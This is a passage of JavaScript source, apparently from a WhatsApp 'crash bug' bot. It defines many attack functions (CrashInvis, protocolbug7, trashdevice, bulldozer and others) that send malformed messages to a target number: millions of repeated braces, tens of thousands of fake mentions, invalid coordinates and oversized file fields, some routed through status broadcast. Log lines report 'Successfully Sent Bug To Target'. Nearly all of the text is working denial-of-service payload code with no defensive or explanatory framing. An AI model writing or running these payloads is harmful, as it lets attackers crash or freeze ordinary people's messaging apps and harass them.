            version: 2,
            is_ai_message: true, 
            should_show_system_message: true, 
            ticket_id: crypto.randomBytes(2008)
            }
           }, 
            interactiveMessage: {
              header: {
                text: '</𖥂 𝒀𝒖𝒖𝒌𝒆𝒚 𝒁𝒆𝒑𝒑𝒆𝒍𝒊 𖥂\\>',
                locationMessage: {
                  degreesLatitude: 999999999,
                  degreesLongitude: -999999999,
                  name: '{'.repeat(100000),
                  address: '{'.repeat(100000)
                }
              },
              body: { text: "" },
              footer: { text: "" },
              nativeFlowMessage: {
                messageParamsJson: '{'.repeat(30000)
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: ["0@s.whatsapp.net",
                  ...Array.from(
                    {
                      length: 30000,
                    },
                    () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                  ),
                ],
              }, 
              imageMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m239/AQOwVLfbGcG0Vmvro-BPp1MsgWrep4hkCfzhZyZ3Avg4sJ-JLKPMlk7oRGaVuUoNNoBzIzX7UbhDPUH5Gk1hG701GvvCRbj0K3paBesGug?ccb=9-4&oh=01_Q5Aa1wGU8qrxFqlumnPl5DyyC_DfwC8fN8l2HwV2HIpfGu0Nlg&oe=6884BEFB&_nc_sid=e6ed6c&mms3=true",
                mimetype: "image/jpeg",
                fileSha256: "o2Eb2bT8YhZ8cqXOEYAognoQD/PsaEjg8FE9NbF9tDs=",
                fileLength: "182328",
                height: 1280,
                width: 1280,
                mediaKey: "npSqB+cuTkghZ2rifzzMQkhyUf5d8Iwa+5HlHGL3tcA=",
                caption: "</𖥂 𝒀𝒖𝒖𝒌𝒆𝒚 𝒁𝒆𝒑𝒑𝒆𝒍𝒊 𖥂\\>",
                fileEncSha256: "nQZ221+c8J3gzT77f7Li33klE8TagaSjA7AM55arqLA=",
                directPath: "/o1/v/t24/f2/m239/AQOwVLfbGcG0Vmvro-BPp1MsgWrep4hkCfzhZyZ3Avg4sJ-JLKPMlk7oRGaVuUoNNoBzIzX7UbhDPUH5Gk1hG701GvvCRbj0K3paBesGug?ccb=9-4&oh=01_Q5Aa1wGU8qrxFqlumnPl5DyyC_DfwC8fN8l2HwV2HIpfGu0Nlg&oe=6884BEFB&_nc_sid=e6ed6c",
                mediaKeyTimestamp: "1750938694",
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: ["0@s.whatsapp.net",
                  ...Array.from(
                    {
                      length: 30000,
                    },
                    () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                  ),
                ],
              }, 
              videoMessage: {
                url: "https://mmg.whatsapp.net/v/t62.7161-24/21416858_2558442404498210_7729407464837294349_n.enc?ccb=11-4&oh=01_Q5Aa1wGPwpmPlCPnQdMLs3pqYC9K15fPn7ui1Hj7-LRk29JBJA&oe=68731A02&_nc_sid=5e03e0&mms3=true",
                mimetype: "video/mp4",
                fileSha256: "vjSnpPeWQ7ly+37/XaC1e4XwwiPHUaIvPWyf3/Pqlbw=",
                fileLength: "3070510",
                seconds: 16,
                mediaKey: "GE3pFBmSXUH2lWGJKvJYY2U5BIgZyVKQF6JJyzaZNWI=",
                height: 864,
                width: 480,
                fileEncSha256: "n6q6pu9BeJ0dDkSRpKa8y2OtVbZ2bw6pLfKzoyFB/Yc=",
                directPath: "/v/t62.7161-24/21416858_2558442404498210_7729407464837294349_n.enc?ccb=11-4&oh=01_Q5Aa1wGPwpmPlCPnQdMLs3pqYC9K15fPn7ui1Hj7-LRk29JBJA&oe=68731A02&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1749720441",
              },
              contextInfo: {
                participant: "0@s.whatsapp.net",
                remoteJid: "status@broadcast",
                mentionedJid: ["0@s.whatsapp.net",
                  ...Array.from(
                    {
                      length: 30000,
                    },
                    () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                  ),
                ],
              }
            }
          }
        }
      };
      
      const msg = await generateWAMessageFromContent(target, message, { quoted: null });
      
      await kyzz.relayMessage(target, msg.message, {
        participant: { jid: target },
        messageId: msg.key.id
      });
      
      console.log(`Forclose to ${target}`);
    } catch (err) {
      console.error("❌ Gagal forclose:", err);
    }
  }
}

async function ForceInvisibleCoreNew(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "HEHA",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: "HEHA",
                address: "\u200D",
              },
            },
            body: {
              text: "HEHA",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(100000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };

    await kyzz.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}
async function ButtonCore(target) { 
  var messageContent = generateWAMessageFromContent(target, proto.Message.fromObject({
    'viewOnceMessage': {
      'message': {
        'interactiveMessage': {
          'header': {
            'title': '',
            'subtitle': " "
          },
          'body': {
            'text': "Changli Crashers"
          },
          'footer': {
            'text': 'xp'
          },
          'nativeFlowMessage': {
            'buttons': [{
              'name': 'cta_url',
              'buttonParamsJson': "{ \"display_text\" : \"Changli Crashers\", \"url\" : \"\", \"merchant_url\" : \"\" }"
            }],
            'messageParamsJson': "{".repeat(10000000)
          }
        }
      }
    }
  }), {
    'userJid': target
  });
  await kyzz.relayMessage(target, messageContent.message, { 
    'participant': {
      'jid': target
    },
    'messageId': messageContent.key.id
  });
  console.log(chalk.blue("Succes send Button Ui New 🍷"));
}
async function LocationFlowX1(target) {
try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: " ",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude:  -999.03499999999999,
                degreesLongitude: 922.999999999999,
                name: "ꉔꁝꋬꋊꍌ꒒꒐ ꁝꋬꋪꏂꂵ",
                address: "꧀꧀꧀꧀꧀꧀꧀꧀꧀꧀",
              },
            },
            body: {
              text: " "
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(1000000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await kyzz.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
    console.log(chalk.blue("Succes send Location Ui New 🍷"));
  } catch (err) {
    console.log(err);
  }
}
async function CrashInvis(target) {
  try {
    const coreMsg = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              locationMessage: {
                degreesLatitude: 0,
                degreesLongitude: 0,
                name: "\u200E",
                address: "\u0007".repeat(20000),
              }
            },
            body: {
              text: "",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(500000),
            }
          }
        }
      }
    };

    await kyzz.relayMessage(target, coreMsg, {
      participant: { jid: target },
      messageId: undefined
    });

    const followupMsg = {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: {
              text: "",
              format: "DEFAULT"
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(100000),
              version: 3
            }
          }
        }
      }
    };

    await kyzz.relayMessage(target, followupMsg, {
      participant: { jid: target }
    });

    await new Promise(resolve => setTimeout(resolve, 300));
  } catch (err) {}
}
async function LocaBetanew2(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: { 
              text: `‌𝐈𝐬‌𝐚‌𝐠𝐢 ⍣᳟᪳ 𝐈‌𝐧‌𝐟𝐢𝐧‌𝐢‌𝐭𝐲${"꧀".repeat(2500)}.com - _ #`
            },
            nativeFlowMessage: {
            messageParamsJson: "{".repeat(100000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await kyzz.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}	      
async function trashdevice(target) {
    const messagePayload = {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                                url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                                mimetype: "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
                                fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                                fileLength: "999999999999",
                                pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                                mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                                fileName: `𝐊͢𝐲𝐳𝐳⃰𝐓𝐫𝐚⋎𝐢𝐒𝐳𝐚𝐩⃰༑͢⃟༑ ラ‣ 𐎟`,
                                fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                                directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                                mediaKeyTimestamp: "1715880173"
                            },
                        hasMediaAttachment: true
                    },
                    body: {
                            text: "𝐊͢𝐲𝐳𝐳⃰𝐓𝐫𝐚⋎𝐢𝐒𝐳𝐚𝐩⃰༑͢⃟༑ ラ‣ 𐎟" + "ꦾ".repeat(150000) + "@1".repeat(250000)
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                            mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                            groupMentions: [{ groupJid: "1@newsletter", groupSubject: "ALWAYSAQIOO" }],
                        isForwarded: true,
                        quotedMessage: {
								documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "999999999999",
											pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "Alwaysaqioo The Juftt️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
						}
                    }
                    }
                }
            }
        }
    };

    kyzz.relayMessage(target, messagePayload, { participant: { jid: target } }, { messageId: null });
}
async function NortInvcx(target) {
var etc = generateWAMessageFromContent(target, ({
  'listMessage': {
    'title': "‌AUTOCRASH" + "ꦻ".repeat(777777) + "\u200b".repeat(88888) + '~@25~'.repeat(55555),
        'footerText': 'CRASH',
        'buttonText': 'AUTOCRASH',
        'listType': 2,
        'productListInfo': {
          'productSections': [{
            'title': 'Detech',
            'products': [
              { "productId": "4392524570816732" }
            ]
          }],
          'productListHeaderImage': {
            'productId': '4392524570816732',
            'jpegThumbnail': null
          },
          'businessOwnerJid': '0@s.whatsapp.net'
        }
      },
      'footer': 'BauGacor',
      'contextInfo': {
        'expiration': 604800,
        'ephemeralSettingTimestamp': "1679959486",
        'entryPointConversionSource': "global_search_new_chat",
        'entryPointConversionApp': "whatsapp",
        'entryPointConversionDelaySeconds': 9,
        'disappearingMode': {
          'initiator': "INITIATED_BY_ME"
        }
      },
      'selectListType': 2,
      'product_header_info': {
        'product_header_info_id': 292928282928,
        'product_header_is_rejected': false
      }
    }), { userJid: target });
await kyzz.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id });
}

async function paradoxes(target) {
  for (let i = 0; i < 50; i++) {
    const msg = await generateWAMessageFromContent(
      target,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: { title: "TeamGalaxy ¿?", hasMediaAttachment: false },
              body: { text: "𝐄͢𝐭͡𝐞͜𝐫͡𝐧⍣᳟𝐚͡𝐥͡𝐆͢𝐚𝐥𝐚͜𝐱͡𝐲⍣᳟꙳⟅" },
              nativeFlowMessage: {
                messageParamsJson: "{".repeat(10000),
              },
            },
          },
        },
      },
      {}
    );
    await kyzz.relayMessage(target, msg.message, {});

    await kyzz.relayMessage(target, {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              documentMessage: {
                url: "https://mmg.whatsapp.net/...",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                fileLength: "9999999999999",
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "NtahMengapa..",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/...",
                mediaKeyTimestamp: "1726867151",
                contactVcard: true,
                jpegThumbnail: ""
              },
              hasMediaAttachment: true
            },
            body: {
              text: "༑𝐄͢𝐭͡𝐞͜𝐫͡𝐧⍣᳟𝐚͡𝐥͡𝐆͢𝐚𝐥𝐚͜𝐱͡𝐲⍣᳟꙳⟅\n" +
                "ꦽ".repeat(1000) + "@13135550202".repeat(15000)
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "cta_url",
                  buttonParamsJson: JSON.stringify({
                    display_text: "GalaxyNoxxa",
                    url: "https://t.me/noxxasoloo",
                    merchant_url: "https://t.me/noxxasoloo"
                  })
                },
                { name: "call_permission_request", buttonParamsJson: "{}" }
              ],
              messageParamsJson: "{}"
            },
            contextInfo: {
              mentionedJid: [
                "13135550202@s.whatsapp.net",
                ...Array.from({ length: 30000 }, () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
                )
              ],
              forwardingScore: 1,
              isForwarded: true,
              fromMe: false,
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              quotedMessage: {
                documentMessage: {
                  url: "https://mmg.whatsapp.net/...",
                  mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                  fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                  fileLength: "9999999999999",
                  pageCount: 1316134911,
                  mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
                  fileName: "NtahMengapa..",
                  fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
                  directPath: "/v/t62.7119-24/...",
                  mediaKeyTimestamp: "1724474503",
                  contactVcard: true,
                  jpegThumbnail: ""
                }
              }
            }
          }
        }
      }
    }, { participant: { jid: target } });

    await kyzz.relayMessage(target, {
      extendedTextMessage: {
        text: "‼ TeamGalaxy𝂀 ¿? " + "𑇂𑆵𑆴𑆿".repeat(60000),
        contextInfo: {
          stanzaId: "FTG-EE62BD88F22C",
          participant: "5521992999999@s.whatsapp.net",
          quotedMessage: {
            contactMessage: {
              displayName: "‼️⃟ ༚ Galaxy𝂀 ¿? " + "𑇂𑆵𑆴𑆿".repeat(60000),
              vcard: "BEGIN:VCARD\nVERSION:3.0\nFN:@noxxasoloo\nX-WA-BIZ-NAME:@noxxasoloo\nORG:@xrelly;\nTEL;type=CELL;type=VOICE;waid=5521992999999:+55 21 99299-9999\nEND:VCARD"
            }
          }
        }
      }
    }, { participant: target });

    await kyzz.relayMessage(target, {
      extendedTextMessage: {
        text: "ꦾ".repeat(20000) + "@1".repeat(20000),
        contextInfo: {
          stanzaId: target,
          participant: target,
          quotedMessage: {
            conversation: "dor blank" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(20000)
          },
          disappearingMode: {
            initiator: "CHANGED_IN_CHAT",
            trigger: "CHAT_SETTING"
          }
        },
        inviteLinkGroupTypeV2: "DEFAULT"
      }
    }, {
      paymentInviteMessage: {
        serviceType: "UPI",
        expiryTimestamp: Date.now() + 5184000000
      }
    }, {
      participant: {
        jid: target
      }
    }, {
      messageId: null
    });
  }
}

async function NortBlank(target) {
  try {
    await kyzz.relayMessage(
      target,
      {
        ephemeralMessage: {
          message: {
            interactiveMessage: {
              header: {
                locationMessage: {
                  degreesLatitude: 0,
                  degreesLongitude: 0,
                },
                hasMediaAttachment: true,
              },
              body: {
                text:
                  "𝐊͢𝐲𝐳𝐳⃰𝐓𝐫𝐚⋎𝐢𝐒𝐳𝐚𝐩⃰༑͢⃟༑ ラ‣ 𐎟\n" +
                  "ꦾ".repeat(92000) +
                  "ꦽ".repeat(92000) +
                  `@1`.repeat(92000),
              },
              nativeFlowMessage: {},
              contextInfo: {
                mentionedJid: [
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                  "1@newsletter",
                ],
                groupMentions: [
                  {
                    groupJid: "1@newsletter",
                    groupSubject: "Vamp",
                  },
                ],
                quotedMessage: {
                  documentMessage: {
                    contactVcard: true,
                  },
                },
              },
            },
          },
        },
      },
      {
        participant: { jid: target },
        userJid: target,
      }
    );
  } catch (err) {
    console.log(err);
  }
}
async function protocolbug7(isTarget, mention) {
  const floods = 40000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedJids = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedJid: mentionedJids,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "𝐊͢𝐲𝐳𝐳⃰𝐓𝐫𝐚⋎𝐢𝐒𝐳𝐚𝐩⃰"
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(isTarget, messageContent, { userJid: isTarget });

  const broadcastSend = {
    messageId: msg.key.id,
    statusJidList: [isTarget],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: isTarget }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await kyzz.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await kyzz.relayMessage(isTarget, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}
async function protocolbug8(isTarget, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        )
    ];

    const embeddedMusic = {
        musicContentMediaId: "589608164114571",
        songId: "870166291800508",
        author: ".EJmbot!" + "ោ៝".repeat(10000),
        title: "Finix",
        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
        artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
        countryBlocklist: true,
        isExplicit: true,
        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
    };

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        caption: "Erlanggaa?✦ Im Begginner",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            newsletterName: "༿༑ᜳ𝐊𝐲𝐳𝐳𝐎𝐟𝐟𝐢𝐜𝐢𝐚𝐥"
        },
        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
        annotations: [
            {
                embeddedContent: {
                    embeddedMusic
                },
                embeddedAction: true
            }
        ]
    };

    const msg = generateWAMessageFromContent(isTarget, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await kyzz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [isTarget],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: isTarget }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await kyzz.relayMessage(isTarget, {
            statusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
}
async function trashprotocol(target, mention) {
    const mentionedList = [
        "13135550002@s.whatsapp.net",
        ...Array.from({ length: 40000 }, () =>
            `1${Math.floor(Math.random() * 2000000)}@s.whatsapp.net`
        )
    ];

    const videoMessage = {
        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
        mimetype: "video/mp4",
        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
        fileLength: "289511",
        seconds: 15,
        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
        height: 640,
        width: 640,
        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
        mediaKeyTimestamp: "1743848703",
        contextInfo: {
            isSampled: true,
            mentionedJid: mentionedList
        },
        annotations: [],
        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k="
    };

    const msg = generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: { videoMessage }
        }
    }, {});

    await kyzz.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            { tag: "to", attrs: { jid: target }, content: undefined }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await kyzz.relayMessage(target, {
            groupStatusMentionMessage: {
                message: {
                    protocolMessage: {
                        key: msg.key,
                        type: 25
                    }
                }
            }
        }, {
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: { is_status_mention: "true" },
                    content: undefined
                }
            ]
        });
    }
console.log(chalk.green(`( ! ) TrashProto - Successfully Sent Bug To Target`));
}
async function bulldozer(kyzz, target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              "0@s.whatsapp.net",
              ...Array.from(
                {
                  length: 40000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
